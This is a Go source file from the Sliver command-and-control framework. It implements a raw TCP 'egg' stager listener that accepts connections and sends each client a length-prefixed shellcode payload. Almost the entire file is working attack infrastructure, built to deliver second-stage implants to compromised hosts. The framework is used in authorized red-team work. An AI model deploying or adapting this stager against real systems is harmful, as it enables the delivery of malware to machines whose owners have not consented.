package c2

import (
	"encoding/binary"
	"fmt"
	"net"

	"github.com/bishopfox/sliver/server/log"
)

var (
	tcpLog = log.NamedLogger("c2", "tcp-egg")
)

// StartTCPListener - Start a TCP listener
func StartTCPListener(bindIface string, port uint16, data []byte) (net.Listener, error) {
	tcpLog.Infof("Starting Raw TCP listener on %s:%d", bindIface, port)
	ln, err := net.Listen("tcp", fmt.Sprintf("%s:%d", bindIface, port))
	if err != nil {
		mtlsLog.Error(err)
		return nil, err
	}
	go acceptConnections(ln, data)
	return ln, nil
}

func acceptConnections(ln net.Listener, data []byte) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			if errType, ok := err.(*net.OpError); ok && errType.Op == "accept" {
				break
			}
			tcpLog.Errorf("Accept failed: %v", err)
			continue
		}
		go handleConnection(conn, data)
	}
}

func handleConnection(conn net.Conn, data []byte) {
	mtlsLog.Infof("Accepted incoming connection: %s", conn.RemoteAddr())
	// Send shellcode size
	dataSize := uint32(len(data))
	lenBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(lenBuf, dataSize)
	tcpLog.Infof("Shellcode size: %d\n", dataSize)
	final := append(lenBuf, data...)
	tcpLog.Infof("Sending shellcode (%d)\n", len(final))
	// Send shellcode
	conn.Write(final)
	// Closing connection
	conn.Close()
}
